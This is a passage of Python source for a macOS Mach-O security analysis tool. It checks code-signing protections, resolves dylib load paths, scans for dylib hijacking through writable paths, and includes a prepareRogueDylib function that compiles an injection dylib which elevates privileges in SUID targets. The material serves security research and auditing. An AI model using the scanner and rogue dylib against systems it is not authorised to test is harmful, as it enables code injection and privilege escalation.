        '''Verifies if the application is notarized and can pass the Gatekeeper verification.'''
        result = subprocess.run(["spctl", "-a", file_path], capture_output=True)
        if result.stderr == b'':
            return True
        else:
            #print(f"[INFO -> NOTARIZATION]: {result.stderr.decode().rstrip()}")
            return False

    def isEncrypted(self):
        '''If the cryptid has a non-zero value, some parts of the binary are encrypted.'''
        if self.binary.has_encryption_info:
            if self.binary.encryption_info.crypt_id == 1:
                return True
        return False

    def hasRestrictSegment(self):
        '''Check if binary contains __RESTRICT segment. Return True if it does.'''
        for segment in self.binary.segments:
            if segment.name.lower().strip() == "__restrict":
                return True
        return False

    def hasRestrictFlag(self, file_path):
        '''Check if Code Signature flag CS_RESTRICT 0x800(restrict) is set for the given binary'''
        if b'restrict' in self.getCodeSignature(file_path):
            return True
        return False

    def isRestricted(self, file_path):
        '''Check if binary has __RESTRICT segment or CS_RESTRICT flag set.'''
        if self.hasRestrictSegment() or self.hasRestrictFlag(file_path):
            return True
        return False

    def hasHardenedRuntimeFlag(self, file_path):
        '''Check if Hardened Runtime flag is set for the given binary.'''
        if b'runtime' in self.getCodeSignature(file_path):
            return True
        return False

    def hasAppSandbox(self, file_path):
        '''Check if App Sandbox is in use (com.apple.security.app-sandbox entitlement is set).'''
        if self.checkIfEntitlementIsUsed('com.apple.security.app-sandbox', 'true', file_path):
            return True
        return False

    def getForifiedSymbols(self):
        '''Check for symbol names that contain _chk suffix and filter out stack canary symbols. Function returns a list of all safe symbols.'''
        symbol_fiter = ['___stack_chk_fail', '___stack_chk_guard']
        fortified_symbols = []
        for symbol in self.binary.symbols:
            symbol_name = symbol.name.lower().strip()
            if ('_chk' in symbol_name) and (symbol_name not in symbol_fiter):
                fortified_symbols.append(symbol_name)
        return fortified_symbols

    def isFortified(self, fortified_symbols):
        '''Check if there are any fortified symbols in the give fortified_symbols list.'''
        if len(fortified_symbols) > 0:
            return True
        return False

    def hasRpath(self):
        return self.binary.has_rpath

### --- IV. DYLIBS --- ### 
class DylibsProcessor:
    def __init__(self):
        '''This class contains part of the code from the main() for the SnakeIV: Dylibs.'''
        pass

    def process(self, args):
            if args.dylibs: # Shared dylibs with unresolved paths
                snake_instance.printDylibs()

            if args.rpaths: # All resolved paths from LC_RPATHs
                snake_instance.printRpathsResolved()

            if args.rpaths_u: # All inresolved paths from LC_RPATHs
                snake_instance.printRpathsUnresolved()

            if args.dylibs_paths: # Resolved dylib loading paths in order they are searched for
                snake_instance.printResolvedDylibPaths()

            if args.dylibs_paths_u: # Unresolved dylib loading paths (same as --dylibs, but without version info)
                snake_instance.printUnresolvedDylibPaths()

            if args.broken_relative_paths: #  Relative paths
                snake_instance.printBrokenRelativePaths()

            if args.dylibtree: #  Dylibtree
                args_dylibtree = args.dylibtree.split(',')
                dylibtree = snake_instance.getDylibTree(args_dylibtree[0], args_dylibtree[1],args_dylibtree[2])
                snake_instance.printTreeFromTreelib(dylibtree)

            if args.dylib_id: # Path from Dylib ID Load Command
                print(snake_instance.getPathFromDylibID())

            if args.reexport_paths: # All reexported libraries paths
                print(*snake_instance.getReExportPaths(), sep="\n")

            if args.hijack_sec: # Check Dylib Hijacking protection on binary
                print("DYLIB HIJACKIG PROTECTION: " + str(snake_instance.checkDylibHijackingProtections(snake_instance.file_path)))

            if args.dylib_hijacking: # Direct & Indirect Dylib Hijacking check
                if args.dylib_hijacking == 'default':
                    args.dylib_hijacking = None
                all_results = snake_instance.dylibHijackingScanner(args.dylib_hijacking)
                snake_instance.parseDylibHijackingScannerResults(all_results)

            if args.dylib_hijacking_a: # Show only possible vectors 
                if args.dylib_hijacking_a == 'default':
                    args.dylib_hijacking_a = None
                all_results = snake_instance.dylibHijackingScanner(args.dylib_hijacking_a)
                dh_check = snake_instance.isVulnDylibHijacking(all_results)
                if dh_check:
                    print(dh_check)

            if args.prepare_dylib is not None: # Compile rogue dylib
                snake_instance.prepareRogueDylib(args.prepare_dylib)

class SnakeIV(SnakeIII):
    def __init__(self, binaries, file_path):
        '''
            When initiated, it run series of commands to extract:
                - all load commands
                - dylib loading commands
                - dylib ID (if exists)
                - rpaths (resolved)
                - absolute paths (@executable_path|@loader_path|@rpath resolved)
            Sets default Dyld Shared Cache location
        '''
        super().__init__(binaries, file_path)
        self.dylib_load_commands_names = {
        'LAZY_LOAD_DYLIB',
        'LOAD_DYLIB',
        'LOAD_UPWARD_DYLIB',
        'LOAD_WEAK_DYLIB',
        'PREBOUND_DYLIB',
        'REEXPORT_DYLIB',
        }
        self.dylib_id_path = self.getPathFromDylibID() # Get Dylib ID for @loader_path resolving
        self.dylib_loading_commands, self.dylib_loading_commands_names = self.getDylibLoadCommands() # 1. Get dylib specific load commands
        self.rpath_list = self.resolveRunPathLoadCommands() # 2. Get LC_RPATH list
        self.absolute_paths = self.resolveDylibPaths() # 3. Get all dylib absolute paths dictionary {dylib_name[dylib_paths]}
        self.dyld_share_cache_path = '/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e'

    def getSharedLibraries(self, only_names=True):
        '''
            Return array of shared libraries used by the binary. 
            When the only_names is set to False it aslo prints compatibility and current version of each library.
        '''
        dylibs = []
        for library in self.binary.libraries:
            if only_names:
                dylibs.append(library.name)
            else:
                formatted_compat_version = ".".join(map(str, library.compatibility_version))
                formatted_current_version = ".".join(map(str, library.current_version))
                dylibs.append(f"{library.name} (compatibility version: {formatted_compat_version}, current version: {formatted_current_version})")
        return dylibs

    def getDylibLoadCommands(self):
        '''Return a list of load commands that load dylibs.'''
        dylib_loading_commands = []
        dylib_loading_commands_names = []

        for cmd in self.load_commands:
            cmd_name = cmd.command.name
            if cmd_name in self.dylib_load_commands_names:
                dylib_loading_commands.append(cmd)
                dylib_loading_commands_names.append(cmd_name)

        return dylib_loading_commands, dylib_loading_commands_names

    def getUnresolvedRunPathLoadCommandsPaths(self):
        '''
            Return a list of unresolved paths (like @executable_path/Frameworks) from LC_RPATH load commands. Example return:
            ['/usr/lib/swift', '@executable_path/Frameworks', '@loader_path/Frameworks']
        '''
        return [cmd.path for cmd in self.load_commands if cmd.command.name == 'RPATH']

    def resolveRunPathLoadCommands(self):
        '''
            Return a list of resolved (absolute) paths from LC_RPATH. Example return:
            ['/usr/lib/swift', '/Applications/Suunto.app/WrappedBundle/Frameworks', '/Applications/Suunto.app/WrappedBundle/Frameworks']
        '''
        executable_path = os.path.dirname(self.file_path)
        if self.dylib_id_path:
            loader_path = self.dylib_id_path
        else:
            loader_path = executable_path

        unresolved_LC_RPATHS = self.getUnresolvedRunPathLoadCommandsPaths()
        LC_RPATHS = []
        for path in unresolved_LC_RPATHS:
            if path.startswith('@executable_path'):
                path = path.replace('@executable_path',executable_path)
                LC_RPATHS.append(path)
            elif path.startswith('@loader_path'):
                path = path.replace('@loader_path',loader_path)
                LC_RPATHS.append(path)
            else:
                LC_RPATHS.append(path)
        return LC_RPATHS

    def extractPathFromDylibLoadCommandStruct(self, dylib_load_command):
        '''Extracts the string path from a dylib load command structure.'''
        cmd_data = bytes(dylib_load_command.data)
        offset_data = cmd_data[8:]
        offset = int.from_bytes(offset_data[:4], byteorder=self.endianess)
        string_data = cmd_data[offset:]
        null_index = string_data.find(0)
        path_bytes = string_data[:null_index]
        path_string = path_bytes.decode('utf-8')
        return path_string

    def resolveRunPathPaths(self, path):
        '''
            Return ordered list of resolved @rpaths for the given dylib path.
            Example return for self.rpath_list = ['/1/', '/2/'] and dylib path = @rpath/test.dylib
                [ '/1/test.dylib', '/2/test.dylib']
        '''
        resolved_rpaths = []
        for rpath in self.rpath_list:
            resolved_rpaths.append(path.replace('@rpath',rpath))
        return resolved_rpaths

    def resolveDylibPaths(self):
        '''
            Return a dictionary of dylib_name : dylib_absolute_paths
            Paths are absolute (with resolved @rpath, @executable_path, @loader_path)
        '''
        executable_path = os.path.dirname(self.file_path)
        if self.dylib_id_path:
            loader_path = self.dylib_id_path
        else:
            loader_path = executable_path 
        absolute_paths = {}

        for dylib_load_command in self.dylib_loading_commands:
            path = self.extractPathFromDylibLoadCommandStruct(dylib_load_command)
            name = os.path.basename(path)

            if name not in absolute_paths:
                absolute_paths[name] = []

            if path.startswith('@executable_path'):
                path = path.replace('@executable_path', executable_path)
                absolute_paths[name].append(path)

            elif path.startswith('@rpath'):
                paths = self.resolveRunPathPaths(path)
                absolute_paths[name].extend(paths)

            elif path.startswith('@loader_path'):
                path = path.replace('@loader_path', loader_path)
                absolute_paths[name].append(path)

            else:
                absolute_paths[name].append(path)

        return absolute_paths

    def checkBrokenRelativeDylibSource(self):
        '''
            Check for bad dylib source.
            When Dylib is relative, but does not use @executable_path | @loader_path | @rpath.
            For example: mylib.dylib instead of @executable_path/mylib.dylib
        '''
        broken_relative_dylibs = []
        for _, paths in self.absolute_paths.items(): # Iterate dylibs:paths dictionary
            for path in paths:
                if not path.startswith('/'):
                    broken_relative_dylibs.append(path)

        return broken_relative_dylibs

    def checkIfPathExists(self, path):
        '''Check if specified path exists on the filesystem.'''
        return os.path.exists(path)

    def checkIfPathExistsInDyldSharedCache(self, path, extracted_dyld_share_cache_directory_path):
        '''Return if the path exists in the DSC - you must first extract it.'''
        path = os.path.abspath(extracted_dyld_share_cache_directory_path) + "/" + path
        return self.checkIfPathExists(path)

    def runDyldSharedCacheExtractor(self, dyld_share_cache_path, extracted_output_path):
        '''Run dyld-shared-cache-extractor command.'''
        command = ['dyld-shared-cache-extractor', dyld_share_cache_path, extracted_output_path]
        subprocess.run(command, check=True)

    def getDylibTree(self, dyld_share_cache_path=None, extracted_output_path=None, is_extracted=0):
        '''
            A function that inspects the dynamic dependencies of a Mach-O binary recursively (like recursive otool -L). 
            You must use absolute path in --path if you are using --dylibtree from extracted Dyld Shared Cache.
        '''
        if dyld_share_cache_path in [None, '']:
            dyld_share_cache_path = self.dyld_share_cache_path

        if extracted_output_path in [None, '']:
            extracted_output_path = 'extracted_dyld_share_cache/'
        extracted_output_path = os.path.abspath(extracted_output_path) # Convert to absolute path

        if is_extracted == '0':
            self.runDyldSharedCacheExtractor(dyld_share_cache_path, extracted_output_path)

        dylibtree = treelib.Tree()
        path_to_process = [self.file_path]
        already_checked_paths = []
        not_existing_paths = [] # It could be the already_checked_paths for optimization, but for code clarity it stay.
        node_id = 0
        dylibtree.create_node(self.file_path, node_id)

        while path_to_process:
            current_path = path_to_process.pop()

            if (current_path not in path_to_process) and (current_path not in already_checked_paths) and (current_path not in not_existing_paths):
                fat_binary = lief.MachO.parse(current_path)
                dylib_snake_instance = SnakeIV(fat_binary, current_path)

                if current_path.startswith(extracted_output_path): 
                    current_path = current_path.removeprefix(extracted_output_path)

                for _, dylib_paths in dylib_snake_instance.absolute_paths.items():
                    for path in dylib_paths: # All dylibs for current binary (current_path from existing_path_to_process)
                        absolute_path = os.path.abspath(path)
                        node_id += 1
                        filtered_nodes = list(dylibtree.filter_nodes(lambda node: node.tag == current_path))
                        nid_of_first_occurance_of_dylib_in_dylibtree = filtered_nodes[0].identifier
                        # If path exist on the filesystem or DSC, add as a leaf to tree
                        ## current_path(root) -> absolute_path(leaf)
                        if absolute_path not in path_to_process:
                            if dylib_snake_instance.checkIfPathExists(absolute_path):
                                path_to_process.append(absolute_path) # Add this path to process recursively in while loop
                                dylibtree.create_node(absolute_path, node_id, parent=nid_of_first_occurance_of_dylib_in_dylibtree) # Add a path as a leaf
                            elif dylib_snake_instance.checkIfPathExistsInDyldSharedCache(path, extracted_output_path):
                                dsc_path = extracted_output_path + path
                                path_to_process.append(dsc_path)
                                dylibtree.create_node(absolute_path, node_id, data='\033[94mDSC\033[0m',  parent=nid_of_first_occurance_of_dylib_in_dylibtree) # Add a path as a leaf
                            else:
                                not_existing_paths.append(absolute_path)
                                dylibtree.create_node(absolute_path, node_id, data='\033[91mWARNING - not existing path\033[0m',  parent=nid_of_first_occurance_of_dylib_in_dylibtree)

                # If the node path (current_path) was checked, it should not be unwind again.
                already_checked_paths.append(current_path)
                already_checked_paths.append(extracted_output_path + current_path)

        return dylibtree 

    def getDylibID(self):
        '''
        Return a LC_ID_DYLIB Load Command if exists.
        Dyld additionally check if the FILE TYPE == MH_DYLIB.
        I intentionally omit this step to always extract ID.
        '''
        for cmd in self.load_commands:
            if cmd.command.name == 'ID_DYLIB':
                return cmd
        return None

    def getPathFromDylibID(self):
        '''Return a path stored inside the Dylib ID Load Command.'''
        dylib_id_lc = self.getDylibID()
        if dylib_id_lc:
            return self.extractPathFromDylibLoadCommandStruct(dylib_id_lc)
        return None

    def printTreeFromTreelib(self, tree):
        '''
            Helper function for printing the dylibtree. 
            It will only work with this structure because the root id is equal to 0 (tree.get_node(0)), which is not always true.
            I had to write this to make pretty printing with data work because, by default, tree limb does not support printing with data.
            Data is needed to show warnings if any library is missing on the filesystem and to inform if the library was from Dyld Share Cachce.
        '''
        def recursivePrint(node, prefix="", last=True):
            data_str = f": {node.data}" if node.data else ""
            print(f"{prefix}{'`-- ' if last else '|-- '}{node.tag}{data_str}")

            children = tree.children(node.identifier)
            count = len(children)

            for i, child in enumerate(children):
                is_last = i == count - 1
                child_prefix = f"{prefix}{'    ' if last else '|   '}"
                recursivePrint(child, child_prefix, is_last)

        root = tree.get_node(0)
        recursivePrint(root)

    def printDylibs(self):
        dylibs = self.getSharedLibraries(only_names=False)
        if dylibs:
            print(f"{self.file_path} depends on libraries:")
            for d in dylibs:
                print(f"\t{d}")
        else:
            print(f"{self.file_path} does not depend on any libraries.")

    def printRpathsResolved(self):
        '''Print all paths that @rpath can be resolved to.'''
        print(*self.rpath_list, sep="\n")

    def printRpathsUnresolved(self):
        print(*self.getUnresolvedRunPathLoadCommandsPaths(), sep="\n")

    def printResolvedDylibPaths(self):
        '''Prints all resolved (absolute) dylib loading commands paths.'''
        for _, dylib_paths in self.absolute_paths.items():
            print(*dylib_paths, sep='\n')

    def printUnresolvedDylibPaths(self):
        '''Prints all unresolved (with @rpath|@executable_path|@loader_path) dylib loading commands paths.'''
        for dylib_load_command in self.dylib_loading_commands:
            print(self.extractPathFromDylibLoadCommandStruct(dylib_load_command))

    def printBrokenRelativePaths(self):
        '''Print 'broken' relative paths from the binary (cases where the dylib source is specified for an executable directory without @executable_path)'''
        for broken_path in self.checkBrokenRelativeDylibSource():
            print(broken_path)

    def getMissingPaths(self):
        '''Return two unique lists of missing and existing paths.'''
        missing_paths = []
        existing_paths = []
        for _, paths in self.absolute_paths.items():
            for path in paths:
                if os.path.exists(path):
                    existing_paths.append(path)
                    break  # Stop checking further paths for this dylib
                else:
                    missing_paths.append(path)
        unique_missing = list(set(missing_paths))
        unique_existing = list(set(existing_paths))
        return unique_missing, unique_existing

    def checkWriteAccessMissing(self, paths):
        '''
            Check write access for the given paths.
            In case the directory does not exists, traverse back till directory that exists and check write access there.
            Return a list of writeable directories.
        '''
        write_accessible_paths = []
        for path in paths:
            current_path = path
            if os.access(current_path, os.W_OK):
                write_accessible_paths.append(path)
                continue
            while current_path:
                current_path = os.path.dirname(current_path)
                if not os.path.exists(current_path):
                    continue
                if os.access(current_path, os.W_OK):
                    write_accessible_paths.append(path)
                    break
                else:
                    break

        return write_accessible_paths

    def checkWriteAccessExisting(self, paths):
        '''Return a list of write-accessible paths.'''
        write_accessible_paths = []
        for path in paths:
            if os.access(path, os.W_OK):
                write_accessible_paths.append(path)

        return write_accessible_paths

    def hasLibraryValidationFlag(self, file_path):
        '''Check Library validation flag for given binary.'''
        if b'library-validation' in self.getCodeSignature(file_path):
            return True
        return False

    def hasDisableLibraryValidationEntitlement(self, file_path):
        '''
            Checks if the binary has com.apple.security.cs.disable-library-validation or com.apple.private.security.clear-library-validation entitlement set.
            They allows loading dylibs without requiring code signing.
        '''
        if self.checkIfEntitlementIsUsed('com.apple.security.cs.disable-library-validation', 'true', file_path) or self.checkIfEntitlementIsUsed('com.apple.private.security.clear-library-validation','true', file_path):
            return True
        return False

    def getDyldSharedCacheDylibsPaths(self, dsc_path):
        '''
            Parse Dyld Shared Cache using ipsw to extract dylib paths.
            Ref: https://blacktop.github.io/ipsw/docs/guides/dyld/
        '''
        if dsc_path == None:
            dsc_path = self.dyld_share_cache_path

        command = f"ipsw dyld info {dsc_path} -l -j >> /tmp/dyld_shared_cache_temp_1234.json"
        subprocess.run(command, shell=True, check=True)

        with open('/tmp/dyld_shared_cache_temp_1234.json', 'r') as file:
            data = json.load(file)
        os.remove('/tmp/dyld_shared_cache_temp_1234.json')

        # jq -r '.dylibs[].name' dsc.json
        paths = [dylib['name'] for dylib in data.get('dylibs', [])]
        return paths

    def printDyldSharedCacheDylibsPaths(self, dsc_path):
        '''Print Dyld paths from Dyld Shared Cache.'''
        if dsc_path == None:
            dsc_path = self.dyld_share_cache_path

        paths = self.getDyldSharedCacheDylibsPaths(dsc_path)
        for path in paths:
            print(path)

    def checkDylibHijackingProtections(self, file_path):
        '''
            Check protections against dylib hijacking.
            Return True if protected (has library validation ON).
        '''
        
        # Check if 'com.apple.security.cs.disable-library-validation' or 'com.apple.private.security.clear-library-validation' entitlements are present and set to true - INSECURE.
        has_insecure_entitlement = self.hasDisableLibraryValidationEntitlement(file_path)

        # Check if Library validation or Hardened runtime is active - SECURE
        is_hardened_runtime_active = self.hasHardenedRuntimeFlag(file_path)
        is_library_validation_active = self.hasLibraryValidationFlag(file_path)
        
        if has_insecure_entitlement: # Entitlements disables protections
            return False
        elif is_hardened_runtime_active or is_library_validation_active: # If there are no entitlements and HR or LV exists, then protections is ON 
            return True
        else: # If there are no insecure entitlements, but there are also no HR or LV, there are no protections
            return False

    def dylibHijackingScanner(self, dyld_share_cache_path):
        '''
            Direct and Indirect Dylib Hijacking Scanner - return dictionary of results for main binary and each dependancy.
            Save JSON format to /tmp/dylib_hijacking_log.json.
            Return results dictionary.
        '''

        if dyld_share_cache_path in [None, '']:
            dyld_share_cache_path = self.dyld_share_cache_path

        dsc_paths = self.getDyldSharedCacheDylibsPaths(dyld_share_cache_path)
        already_checked_paths = []
        all_results = {}
        path_to_process = [self.file_path]

        while path_to_process:
            current_path = path_to_process.pop()

            result = {
            'is_protected' : bool,
            'writeable_missing_paths' : [],
            'writeable_existing_paths' : []
            }

            if (current_path not in already_checked_paths) and (current_path not in dsc_paths):
                fat_binary = lief.MachO.parse(current_path)
                dylib_snake_instance = SnakeIV(fat_binary, current_path)

                missing_paths, existing_paths = dylib_snake_instance.getMissingPaths()
                result['writeable_missing_paths'] = dylib_snake_instance.checkWriteAccessMissing(missing_paths)
                result['writeable_existing_paths'] = dylib_snake_instance.checkWriteAccessExisting(existing_paths)
                result['is_protected'] = dylib_snake_instance.checkDylibHijackingProtections(dylib_snake_instance.file_path)

                already_checked_paths.append(current_path)
                path_to_process.extend(existing_paths)
                all_results[current_path] = result

        json_file_path = '/tmp/dylib_hijacking_log.json'
        with open(json_file_path, 'a') as json_file:
            json.dump(all_results, json_file)

        return all_results

    def isVulnDylibHijacking(self, all_results):
        '''
            Automatically decide if target is vulnerable to Dylib Hijacking.
            Returns vulnerability info or None if protected.
        '''
        root_binary = True
        info = ''

        for current_path, result in all_results.items():

            if root_binary and result['is_protected']:
                return # Root binary is protected - not vuln

            if not result['is_protected']:
                if result['writeable_existing_paths'] or result['writeable_missing_paths']:
                    if root_binary:
                        info += (f'\033[91mVULNERABLE ROOT BINARY\033[0m: {current_path}\n')
                        root_binary = False
                    else:
                        info += (f'\033[91mVULNERABLE DEPENDENCY\033[0m: {current_path}\n')
                if result['writeable_existing_paths']:
                    info += (f"\033[91mWRITEABLE EXISTING PATHS\033[0m: {', '.join(map(str, result['writeable_existing_paths']))}\n")
                if result['writeable_missing_paths']:
                    info += (f"\033[91mWRITEABLE MISSING PATHS\033[0m: {', '.join(map(str, result['writeable_missing_paths']))}\n")

        if info:
            return info
        else:
            return

    def parseDylibHijackingScannerResults(self, all_results):
        '''
            Print the dylibHijackingScanner results in a nice format.
        '''            
        first_iteration = True

        for current_path, result in all_results.items():
            if first_iteration:
                if result['is_protected']:
                    print(f"\033[92mROOT BINARY PROTECTED\033[0m: {current_path}")
                else:
                    print(f"\033[91mROOT BINARY NOT PROTECTED\033[0m: {current_path}")
                first_iteration = False
            else:
                if result['is_protected']:
                    print(f"\033[92mPROTECTED\033[0m: {current_path}")
                else:
                    print(f"\033[91mNOT PROTECTED\033[0m: {current_path}")
            if result['writeable_existing_paths']:
                print(f"\033[91mWRITEABLE EXISTING PATHS\033[0m: {', '.join(map(str, result['writeable_existing_paths']))}")
            if result['writeable_missing_paths']:
                print(f"\033[91mWRITEABLE MISSING PATHS\033[0m: {', '.join(map(str, result['writeable_missing_paths']))}")
            print("-"*28)

    def getReExportLoadCommands(self):
        '''
        Return a list of REEXPORT_DYLIB Load Commands if exists.
        '''
        reexport_load_commands = []
        for cmd in self.load_commands:
            if cmd.command.name == 'REEXPORT_DYLIB':
                reexport_load_commands.append(cmd)
        return reexport_load_commands

    def getReExportPaths(self):
        '''Return paths stored inside the REEXPORT_DYLIB Load Commands.'''
        reexport_load_commands = self.getReExportLoadCommands()
        paths = []
        if reexport_load_commands:
            for load_command in reexport_load_commands:
                paths.append(self.extractPathFromDylibLoadCommandStruct(load_command))
        return paths 

    def getImportedSymbols(self):
        '''Return a dictionary of imported symbols and names of external libraries where they come from.'''
        imported_symbols = {}

        for symbol in self.binary.imported_symbols:
            binding_info = symbol.binding_info

            if binding_info:
                dylib = binding_info.library
                
                if dylib:
                    imported_symbols[symbol.name] = dylib.name

        return imported_symbols

    def printImportedSymbols(self):
        '''
            Parse getImportedSymbols dictionary in grepable form and print it.
            Symbol names are grouped (sorted) by library. Example output:
                symbol_name : library1
                symbol_name : library1
                symbol_name : library2
                symbol_name : library3
        '''
        imported_symbols = self.getImportedSymbols()
        grouped_symbols = {}

        # Group symbols by unresolved library path
        for symbol_name, unresolved_library_path in imported_symbols.items():
            if unresolved_library_path not in grouped_symbols:
                grouped_symbols[unresolved_library_path] = []
            grouped_symbols[unresolved_library_path].append(symbol_name)

        # Print the grouped symbols
        for unresolved_library_path, symbols in grouped_symbols.items():
            for symbol_name in symbols:
                print(f'{symbol_name} : {unresolved_library_path}')

    def getImportedSymbolsFromTargetLib(self, external_library_name):
        '''
            This function is like a `cat printImportedSymbols | grep external_library`.
            Filter imported symbols in binary (--path binary) to only those from specified external library (--preapre_dylib external_library_name).
            
            https://lief-project.github.io/doc/stable/api/python/macho.html#binary
            https://lief-project.github.io/doc/stable/api/python/macho.html#binding-info
            https://lief-project.github.io/doc/stable/api/python/macho.html#dylibcommand
        '''
        imported_symbols = self.getImportedSymbols()
        grep_result = []
        for symbol_name, unresolved_library_path in imported_symbols.items():
                if external_library_name in unresolved_library_path:
                    grep_result.append(symbol_name)
        
        return grep_result

    def prepareRogueDylib(self, target_library_path=''):
        '''
            Compile m.dylib which by default:
                1. Prints log about successful injection to stdout & stderr syslog.
                2. If the binary is SUID, sets RUID to EUID and prints user ID.
        '''
        file_name_c = 'm.c'
        source_code = SourceCodeManager.dylib_hijacking
        output_filename = 'm.dylib'
        flag_list = ['-dynamiclib']

        if target_library_path:
            imported_sybols = self.getImportedSymbolsFromTargetLib(target_library_path)
        else:
            imported_sybols = []

        if imported_sybols:
            for symbol in imported_sybols:
                if symbol.startswith('_'):
                    symbol = symbol[1:]
                function_to_add = f'\nvoid {symbol}(void){{}}'
                source_code += function_to_add

        SourceCodeManager.clangCompilerWrapper(file_name_c, source_code, output_filename, flag_list)

### --- V. DYLD --- ###
class DyldProcessor:
    def __init__(self):
        '''This class contains part of the code from the main() for the SnakeV: Dyld.'''
        pass
    
    def process(self, args):
            if args.is_built_for_sim: # Check if binary is build for a simulator
                snake_instance.printIsBuiltForSimulator()

            if args.get_dyld_env: # Extract DYLD environment variables from the loader binary
                snake_instance.printDyldEnv()

            if args.compiled_with_dyld_env: # Print Environment variables from the LC_DYLD_ENVIRONMENT
                snake_instance.printDyldEnvLoadCommands()
            
            if args.has_interposing: # Print if binary has interposing sections
                print("INTERPOSING: " + str(snake_instance.hasInterposing()))
                
            if args.interposing_symbols: # Print all replacement symbols from the __interpose section
                snake_instance.printInterposingSymbols()

class SnakeV(SnakeIV):
    def __init__(self, binaries, file_path):
        super().__init__(binaries, file_path)
        self.platforms = {
            1: 'PLATFORM_MACOS',
            2: 'PLATFORM_IOS',
            3: 'PLATFORM_TVOS',
            4: 'PLATFORM_WATCHOS',
            5: 'PLATFORM_BRIDGEOS',
            6: 'PLATFORM_MACCATALYST',
            7: 'PLATFORM_IOSSIMULATOR',
            8: 'PLATFORM_TVOSSIMULATOR',
            9: 'PLATFORM_WATCHOSSIMULATOR',
            10: 'PLATFORM_DRIVERKIT'
        } # https://github.com/Karmaz95/Snake_Apple/blob/main/IV.%20Dylibs/macos/loader.h#L1275

    def isBuiltForSimulator(self):
        '''
            Function for --is_built_for_sim flag.
            https://lief-project.github.io/doc/stable/api/python/macho.html#lief.MachO.BuildVersion.PLATFORMS
            Returns True if platform is in :
            #define PLATFORM_IOSSIMULATOR 7
            #define PLATFORM_TVOSSIMULATOR 8
            #define PLATFORM_WATCHOSSIMULATOR 9.
        '''
        simulator_platforms = [7,8,9]
        platform_value = self.binary.build_version.platform.value
        if platform_value in simulator_platforms:
            return True, platform_value
        elif platform_value > 10:
            return None, platform_value
        else:
            return False, platform_value

    def printIsBuiltForSimulator(self):
        '''
            Print text instead of True|False from the isBuiltForSimulator return.
            Example outputs:
                test platform is PLATFORM_IOSSIMULATOR -> built for simulator.
                executable platform is PLATFORM_MACOS -> not built for simulator
        '''
        name = os.path.basename(self.file_path)
        platform_check, platform_value = self.isBuiltForSimulator()
        if platform_check == True:
            print(f'{name} platform is \033[94m{self.platforms[platform_value]}\033[0m\033[91m -> built for simulator\033[0m. ')
        elif platform_check == None:
            print(f'{name} is build for UNKNOWN platform -> \033[94m{platform_value}\033[0m')
        else:
            print(f'{name} platform is \033[94m{self.platforms[platform_value]}\033[0m\033[92m -> not built for simulator\033[0m')

    def getDyldEnv(self):
        '''Return a list of DYLD environment variables from the binary.'''
        dyld_env = []
        strings_from_CSTRING = self.getStringSection()
        for s in strings_from_CSTRING:
            if s.startswith('DYLD_') and '/' not in s:
                # Exclude DYLD_$ paths (that starts and ends with DYLD_)
                if s.endswith('DYLD_'):
                    continue
                # Remove spaces and all after the first occurrence of space
                s = s.split(' ')[0].strip()
                if s not in dyld_env:
                    dyld_env.append(s)
        return dyld_env

    def printDyldEnv(self):
        '''Print DYLD environment variables from the binary.'''
        dyld_env = self.getDyldEnv()
        if dyld_env:
            print(*dyld_env, sep='\n')
        else:
            print("No DYLD environment variables found.")

    def enumDyldEnvLoadCommands(self):
        '''Check if binary has DYLD_ENVIRONMENT load commands.'''
        all_dyld_env = []

        for cmd in self.load_commands:
            if cmd.command.name == 'DYLD_ENVIRONMENT':
                all_dyld_env.append(cmd)

        return all_dyld_env

    def printDyldEnvLoadCommands(self):
        '''Print DYLD_ENVIRONMENT load commands.'''
        all_dyld_env = self.enumDyldEnvLoadCommands()

        if all_dyld_env:
            for cmd in all_dyld_env:
                print(cmd.value)

    def hasInterposing(self):
        '''Check if binary has interposing sections.'''
        for section in self.binary.sections:
            if section.name == "__interpose":
                return True
        return False

    def getInterposingSymbolsAddresses(self):
        '''Get replacement symbols addresses from the __interpose section.'''
        interposing_symbols_addresses = []
        bit_mask = 0xffffffff
        
        if self.hasInterposing():
            for section in self.binary.sections:
                if section.name == "__interpose":
                    for i in range(0, len(section.content), 16):
                        address = int.from_bytes(section.content[i:i+8], byteorder=self.endianess)
                        interposing_symbols_addresses.append(address)
            
            # Remove binary virtual address base to get the symbol offset only ['0x3f54'] instead of ['0x10000000003f54']
            i = 0
            for addr in interposing_symbols_addresses:
                interposing_symbols_addresses[i] = addr & bit_mask
                i+=1

            return interposing_symbols_addresses

    def getInterposingSymbols(self):
        '''Get all replacement symbols from the __interpose section.'''
        interposing_symbols_addresses = self.getInterposingSymbolsAddresses()
        interposing_symbols_names = []
        
        if interposing_symbols_addresses:
            for symbol in self.getSymbols():
                if symbol.value in interposing_symbols_addresses:
                    interposing_symbols_names.append(symbol.name)

        return interposing_symbols_names, interposing_symbols_addresses
    
    def printInterposingSymbols(self):
        '''Print all replacement symbols from the __interpose section.'''
        symbol_names, symbol_addrs = self.getInterposingSymbols()
        for symbol_name, symbol_addrs in zip(symbol_names, symbol_addrs):
            print(f"{(symbol_name).ljust(32)} {hex(symbol_addrs)}")

### --- VI. AMFI --- ###
class AMFIProcessor:
    def __init__(self):
        '''This class contains part of the code from the main() for the SnakeVI: AMFI.'''
        pass

    def process(self, args):
        if args.dump_prelink_info is not None: # nargs="?", const='PRELINK_info.txt' # Dump '__PRELINK_INFO,__info' to a given file (default: 'PRELINK_info.txt')
            snake_instance.dumpPrelink_info(args.dump_prelink_info)

        if args.dump_prelink_text is not None: # Dump '__PRELINK_TEXT,__text' to a given file (default: 'PRELINK_text.txt')
            snake_instance.dumpPrelink_text(args.dump_prelink_text)

        if args.dump_prelink_kext is not None: # Dump prelinked KEXT from decompressed Kernel Cache to a file named: prelinked_{kext_name}.bin
            snake_instance.dumpKernelExtensionFromPRELINK_TEXT(args.dump_prelink_kext)

        if args.kext_prelinkinfo: # Print _Prelink properties from PRELINK_INFO,__info for a give kext
            snake_instance.printParsedPRELINK_INFO_plist(args.kext_prelinkinfo)

        if args.kmod_info: # Print parsed kmod_info for the given kext
            snake_instance.printParsedkmod_info(args.kmod_info)
        
        if args.kext_entry: # Print kext entrypoint
            snake_instance.printKextEntryPoint(args.kext_entry)
        
        if args.kext_exit: # Print kext exitpoint
            snake_instance.printKextExitPoint(args.kext_exit)

        if args.amfi:
            snake_instance.printExports()

class SnakeVI(SnakeV):
    def __init__(self, binaries, file_path):
        super().__init__(binaries, file_path)
